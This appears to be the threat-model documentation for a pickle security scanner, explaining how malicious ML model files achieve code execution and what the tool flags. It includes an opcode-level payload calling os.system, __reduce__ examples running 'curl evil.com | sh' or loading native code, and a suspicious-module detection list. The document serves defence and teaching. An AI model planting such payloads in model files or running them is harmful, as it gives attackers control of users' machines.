# Pickle threat model

This document explains *exactly* what ML Guard's pickle scanner protects
against, and where its limits are. If you ship models for a living, this
is the page to read before trusting any tool — including ours.

## Why pickle is dangerous

`pickle.load()` and `torch.load()` execute arbitrary Python code by design.
The pickle protocol is a *stack machine*; specific opcodes are equivalent to
"call this Python callable with these arguments".

The minimal RCE payload is about 30 bytes:

```
\x80\x04        # PROTO 4
\x95...         # FRAME (size)
\x8c\x02os      # SHORT_BINUNICODE "os"
\x8c\x06system  # SHORT_BINUNICODE "system"
\x93            # STACK_GLOBAL  → resolves os.system
\x8c\x06id; sh  # SHORT_BINUNICODE "id; sh"
\x85            # TUPLE1
R               # REDUCE  → calls os.system("id; sh")
.               # STOP
```

When a downstream user runs `torch.load(model.pkl)`, this drops them into a
shell. Nothing about the file declares "I am evil" — the malicious behavior
is encoded in the same bytecode as legitimate `__reduce__` overrides.

## Known attacker patterns

### 1. Direct callable resolution
The classic `(callable, args)` tuple via `__reduce__`:
```python
class Evil:
    def __reduce__(self):
        return (os.system, ("curl evil.com | sh",))
```
**ML Guard:** flagged as `pickle-dangerous-global` (critical), because we
record every `GLOBAL`/`STACK_GLOBAL` opcode and check it against the
RCE-callable list.

### 2. Dynamic import via `importlib`
```python
class Evil:
    def __reduce__(self):
        return (importlib.import_module, ("subprocess",))
```
**ML Guard:** `importlib.import_module` is in our RCE list → critical.
Even though no command runs *during the import*, the imported module ends
up on the pickle stack and can be combined with later opcodes.

### 3. ctypes-based loading of native code
```python
class Evil:
    def __reduce__(self):
        return (ctypes.CDLL, ("/tmp/evil.so",))
```
**ML Guard:** `ctypes.CDLL/WinDLL/OleDLL/PyDLL` all flagged → critical.

### 4. PyTorch ZIP wrapper
Modern `torch.save()` writes a ZIP container with `data.pkl` inside.
The malicious payload sits in the inner pickle.

**ML Guard:** automatically detects PyTorch ZIPs and recurses into
`*/data.pkl`. Findings are tagged with the ZIP member path, e.g.
`location: archive/data.pkl @ offset 0x2a1`.

### 5. Obfuscation via `STACK_GLOBAL`
Pickle protocol ≥ 4 (default since Python 3.8) replaced the textual
`GLOBAL "module\nqualname\n"` with `STACK_GLOBAL`, which pops two strings
off the stack. Naive scanners that only grep for `c\nos\nsystem\n` miss this.

**ML Guard:** emulates the pickle stack for string operands. We resolve
the `(module, qualname)` pair from the top of the stack at every
`STACK_GLOBAL` and apply the same checks. If the operands aren't strings
(opaque/computed), we emit `pickle-stack-global-opaque` (medium) — that
itself is suspicious in a model file.

### 6. Suspicious-but-not-RCE modules
`socket`, `urllib`, `requests`, `shutil`, `tempfile`, `marshal` — none
of these directly run code, but you don't expect them in a tensor pickle.
Their presence usually means a payload is preparing exfiltration or
secondary stage.

**ML Guard:** flagged as `pickle-suspicious-module` (high).

## What we deliberately don't do

### We don't run a `RestrictedUnpickler`
`pickle.Unpickler.find_class()` can be subclassed to whitelist callables.
That's a runtime defense — *if* you remember to use it. ML Guard targets
the static-CI use case: catch the model before it's loaded anywhere.

The two are complementary. We recommend doing both:
1. ML Guard in CI to fail PRs that introduce malicious weights.
2. A `RestrictedUnpickler` in production to defend against models that
   slipped past CI (or any of your dependencies that load pickles).

### We don't sandbox-execute
Some scanners run pickle inside a Linux namespace and watch for syscalls.
That's effective but slow, hard to package, and gives attackers a target
(escape the sandbox, exfiltrate). Static analysis is fast and has no
attack surface.

### We don't claim 100% coverage
Two known evasion classes:

- **Time bombs.** A `__reduce__` that's harmless under static analysis but
  fetches the real payload at runtime via a benign-looking call (e.g. the
  pickle includes `pickle.loads` against a string in another file). We flag
  `pickle.loads` as `pickle-suspicious-module`; manually review hits.
- **Obfuscation through unusual modules.** If an attacker uses a function
  in a benign-looking module that has side effects we don't know about
  (e.g. some C extension's seemingly-pure constructor), we'd miss it. The
  `pickle-unusual-module` finding is medium-severity precisely to keep
  those visible.

## Recommendations for ML teams

1. **Convert to safetensors wherever possible.** The format has no code
   execution path. If you're shipping LLM weights, you can almost always
   re-serialize. ML Guard still scans safetensors for trailing payloads,
   but the attack surface is much smaller.
2. **Pin `torch.load(weights_only=True)` (PyTorch 2.6+).** This restricts
   unpickling to a safe subset of types. It blocks most known RCE primitives
   at runtime — but it's only enabled if you remember to set the flag.
3. **Run ML Guard on every PR that touches a model file.** The
   `--fail-on critical` default exists for this reason; set it as a required
   check in branch protection.
4. **Ship the SBOM.** `ml-guard sbom <path>` produces CycloneDX 1.5 with
   per-file SHA-256 + every finding as a vulnerability. Aud-ready.

## References

- Trail of Bits, "Never a dill moment: exploiting machine learning pickle
  files" (2021) — the standard write-up of the attack class.
- HuggingFace, [Pickle Scanning](https://huggingface.co/docs/hub/security-pickle).
- PyTorch advisory PR #129239 — `weights_only=True` discussion.
- CWE-502: Deserialization of untrusted data.
